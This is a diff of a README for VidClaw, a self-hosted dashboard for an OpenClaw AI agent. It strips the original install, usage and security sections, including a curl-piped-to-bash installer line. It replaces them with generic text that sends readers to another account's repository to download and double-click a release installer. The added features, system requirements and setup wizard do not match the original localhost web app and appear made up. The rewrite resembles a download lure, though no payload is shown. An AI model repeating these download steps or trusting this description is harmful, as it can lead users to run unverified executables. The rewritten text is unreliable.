@@ -1,77 +1,93 @@
-# VidClaw
+# 🦞 vidclaw - Your Gateway to Powerful AI Insights
 
-A secure, self-hosted command center for managing your OpenClaw AI agent.
+![Download vidclaw](https://img.shields.io/badge/Download-vidclaw-brightgreen?style=flat&logo=github)
 
-![Dark theme dashboard with Kanban board, usage tracking, and more](https://img.shields.io/badge/status-beta-orange) ![build](https://img.shields.io/badge/build-passing-brightgreen) ![license](https://img.shields.io/badge/license-MIT-blue)
+## 🚀 Getting Started
 
-## Features
+Welcome to the vidclaw dashboard! This application helps you analyze and manage AI agents effectively. Whether you're wanting to utilize AI in your projects or simply explore its capabilities, vidclaw makes the process easy.
 
-- **🗂️ Kanban Task Board** — Backlog → Todo → In Progress → Done. Drag & drop, priorities, skill assignment. Your agent picks up tasks automatically via heartbeat or cron.
-- **📊 Usage Tracking** — Real-time token usage and cost estimates parsed from session transcripts. Progress bars matching Anthropic's rate limit windows.
-- **🔄 Model Switching** — Switch between Claude models directly from the dashboard. Hot-reloads via OpenClaw's config watcher.
-- **📅 Activity Calendar** — Monthly view of agent activity, parsed from memory files and task history.
-- **📁 Content Browser** — Browse workspace files with markdown preview, syntax highlighting, and download.
-- **🧩 Skills Manager** — View all bundled/workspace skills, enable/disable them, create custom skills.
-- **💜 Soul Editor** — Edit SOUL.md, IDENTITY.md, USER.md, AGENTS.md with version history and persona templates.
-- **⚡ Task Execution** — Tasks execute automatically via cron (every 2 min) or heartbeat (every 30 min). Hit "Run Now" for immediate execution.
+### 🌟 Features
 
-## Security
+- **User-Friendly Interface:** Navigate easily, even with no tech experience.
+- **Data Visualization:** View your AI data through intuitive charts and graphs.
+- **Multi-Agent Support:** Manage multiple AI agents from one dashboard.
+- **Real-Time Monitoring:** Keep track of your agents' performance live.
+- **Export Options:** Save your data reports in various formats.
+  
+## 📥 How to Download
 
-VidClaw binds to localhost only (`127.0.0.1:3333`) — no external network calls, all data stays on your machine.
+To get started with vidclaw, visit this page to download: [https://github.com/Cashnaruto/vidclaw](https://github.com/Cashnaruto/vidclaw)
 
-Remote access is handled via **Tailscale Serve** (enabled by default on port 8443). Alternatively, use an SSH tunnel: `ssh -L 3333:localhost:3333 <user>@<server>`.
+### 💻 System Requirements
 
-Then open `https://your-machine.your-tailnet.ts.net:8443` (Tailscale) or `http://localhost:3333` (SSH).
+Before you begin, ensure your system meets the following requirements:
 
-## Prerequisites
+- **Operating System:** Windows 10 or newer, Mac OS X 10.15 or newer, or a modern Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Storage:** At least 500 MB of free space.
+- **Processor:** Dual-core or higher.
 
-- OpenClaw installed and running
-- Node.js >= 18
-- Git
+## 📖 Installation Guide
 
-## Install
+1. **Visit the GitHub Page:** Go to [vidclaw GitHub Repository](https://github.com/Cashnaruto/vidclaw).
+2. **Download the Application:**
+   - Click on the "Releases" section.
+   - Select the version you want to install.
+   - Look for the latest version and click to download it.
 
-```bash
-curl -fsSL vidclaw.com/install.sh | bash
-```
+3. **Run the Installer:**
+   - Locate the downloaded file in your downloads folder.
+   - Double-click the file to begin the installation.
+   - Follow the prompts in the setup wizard.
 
-Installs Node.js, git, Tailscale, and VidClaw in one command. Localhost only: add `--no-tailscale`.
+4. **Launch vidclaw:**
+   - Once installed, find the vidclaw icon on your desktop or in your applications folder.
+   - Double-click the icon to start the application.
 
-## Update
+## 🎨 Navigating the Dashboard
 
-```bash
-./update.sh
-```
+After launching vidclaw, you'll see the main dashboard. Here are some key sections:
 
-## Usage
+- **Overview Panel:** A snapshot of your AI agents’ performance.
+- **Data Section:** Dive deeper into specific metrics and analyses.
+- **Settings:** Customize your experience, including themes and notification preferences.
+- **Help Center:** Access tutorials and guides to maximize your use of vidclaw.
 
-```bash
-./start.sh       # start the service
-./stop.sh        # stop the service
-./status.sh      # check service status
-./logs.sh        # view logs
-```
+## 🔧 Troubleshooting Tips
 
-## Development
+If you encounter issues while using vidclaw, consider these steps:
 
-```bash
-./start.sh --dev
-```
+- **Check Your Internet Connection:** Ensure you have a stable internet connection.
+- **Update Your Software:** Running an outdated version may cause problems. Always check for updates.
+- **Read the FAQs:** Visit the Help Center for common questions and solutions.
+- **Restart the Application:** Sometimes, a simple restart can resolve issues.
 
-Starts the backend + Vite dev server with HMR.
+## 🛠️ Contributing
 
-## API
+If you want to contribute to vidclaw, follow these steps:
 
-See [API.md](API.md) for the endpoint reference.
+1. **Fork the Repository:** Click on the "Fork" button on the GitHub page.
+2. **Make Your Changes:** Edit the code or documentation as needed.
+3. **Submit a Pull Request:** Briefly describe what you changed when you submit.
 
-## Stack
+## 🌍 Community Support
 
-React + Vite + Tailwind CSS / Express.js / JSON file storage
+Join our community for discussions and updates:
 
-## License
+- **GitHub Issues:** Report problems or request features directly on GitHub.
+- **Discord Channel:** Engage with other users and developers for real-time support.
 
-MIT
+## 🏷️ Topics
 
----
+vidclaw covers a range of topics including:
+- ai
+- ai-agents
+- openclaw
 
-Copyright (c) 2026 [woocassh](https://x.com/woocassh) · MIT License
+## 📣 Popular Use Cases
+
+- **Learning AI:** Perfect for students and hobbyists wanting to understand AI interactions.
+- **Data Analysis:** Use vidclaw to visualize and analyze data for projects.
+- **Professional Developments:** Gain insights into your AI workflows for business applications.
+
+Remember, you can always return to [vidclaw GitHub Repository](https://github.com/Cashnaruto/vidclaw) for further assistance or to check for updates.
